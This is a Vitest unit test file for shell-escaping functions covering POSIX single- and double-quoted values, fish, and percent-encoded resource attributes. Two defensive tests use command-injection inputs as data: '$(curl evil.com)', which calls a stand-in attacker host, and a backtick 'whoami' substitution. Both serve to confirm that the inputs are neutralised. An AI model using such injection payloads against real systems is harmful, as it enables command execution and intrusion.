import { describe, it, expect } from "vitest";
import {
  escapeShellValue,
  escapeDoubleQuotedShellValue,
  escapeFishValue,
  escapeResourceAttributeValue,
} from "../../../src/_core/shell/escaping.js";

describe("escapeShellValue", () => {
  it("wraps in single quotes", () => {
    expect(escapeShellValue("hello")).toBe("'hello'");
  });

  it("escapes embedded single quotes", () => {
    expect(escapeShellValue("it's")).toBe("'it'\\''s'");
  });

  it("handles empty string", () => {
    expect(escapeShellValue("")).toBe("''");
  });

  it("strips newline characters", () => {
    expect(escapeShellValue("hello\nworld")).toBe(escapeShellValue("helloworld"));
  });

  it("strips carriage return + newline", () => {
    expect(escapeShellValue("hello\r\nworld")).toBe(escapeShellValue("helloworld"));
  });

  it("strips carriage return alone", () => {
    expect(escapeShellValue("hello\rworld")).toBe(escapeShellValue("helloworld"));
  });
});

describe("escapeDoubleQuotedShellValue", () => {
  it("wraps in double quotes", () => {
    expect(escapeDoubleQuotedShellValue("hello")).toBe('"hello"');
  });

  it("escapes backslashes, double quotes, dollar signs and backticks", () => {
    expect(escapeDoubleQuotedShellValue('a\\b"c$d`e')).toBe('"a\\\\b\\"c\\$d\\`e"');
  });

  it("strips newline characters", () => {
    expect(escapeDoubleQuotedShellValue("hello\nworld")).toBe(
      escapeDoubleQuotedShellValue("helloworld"),
    );
  });

  it("strips carriage return + newline", () => {
    expect(escapeDoubleQuotedShellValue("hello\r\nworld")).toBe(
      escapeDoubleQuotedShellValue("helloworld"),
    );
  });

  it("strips carriage return alone", () => {
    expect(escapeDoubleQuotedShellValue("hello\rworld")).toBe(
      escapeDoubleQuotedShellValue("helloworld"),
    );
  });
});

describe("escapeFishValue", () => {
  it("wraps in single quotes", () => {
    expect(escapeFishValue("hello")).toBe("'hello'");
  });

  it("escapes backslashes and single quotes", () => {
    expect(escapeFishValue("it's\\path")).toBe("'it\\'s\\\\path'");
  });

  it("strips newline characters", () => {
    expect(escapeFishValue("hello\nworld")).toBe(escapeFishValue("helloworld"));
  });

  it("strips carriage return + newline", () => {
    expect(escapeFishValue("hello\r\nworld")).toBe(escapeFishValue("helloworld"));
  });

  it("strips carriage return alone", () => {
    expect(escapeFishValue("hello\rworld")).toBe(escapeFishValue("helloworld"));
  });
});

describe("escapeResourceAttributeValue", () => {
  it("percent-encodes special characters", () => {
    expect(escapeResourceAttributeValue("a,b=c")).toBe("a%2Cb%3Dc");
  });

  it("encodes percent signs first", () => {
    expect(escapeResourceAttributeValue("50%")).toBe("50%25");
  });

  it("encodes double quotes", () => {
    expect(escapeResourceAttributeValue('say "hi"')).toBe("say %22hi%22");
  });

  it("encodes dollar signs", () => {
    expect(escapeResourceAttributeValue("Org$Corp")).toBe("Org%24Corp");
  });

  it("encodes backticks", () => {
    expect(escapeResourceAttributeValue("org`test`")).toBe("org%60test%60");
  });

  it("encodes backslashes", () => {
    expect(escapeResourceAttributeValue("path\\value")).toBe("path%5Cvalue");
  });

  it("neutralizes command substitution payloads", () => {
    expect(escapeResourceAttributeValue("$(curl evil.com)")).toBe("%24(curl evil.com)");
  });

  it("neutralizes backtick command substitution", () => {
    expect(escapeResourceAttributeValue("`whoami`")).toBe("%60whoami%60");
  });

  it("leaves safe characters untouched", () => {
    expect(escapeResourceAttributeValue("hello world")).toBe("hello world");
  });

  it("strips newline characters", () => {
    expect(escapeResourceAttributeValue("hello\nworld")).toBe(
      escapeResourceAttributeValue("helloworld"),
    );
  });

  it("strips carriage return + newline", () => {
    expect(escapeResourceAttributeValue("hello\r\nworld")).toBe(
      escapeResourceAttributeValue("helloworld"),
    );
  });

  it("strips carriage return alone", () => {
    expect(escapeResourceAttributeValue("hello\rworld")).toBe(
      escapeResourceAttributeValue("helloworld"),
    );
  });
});
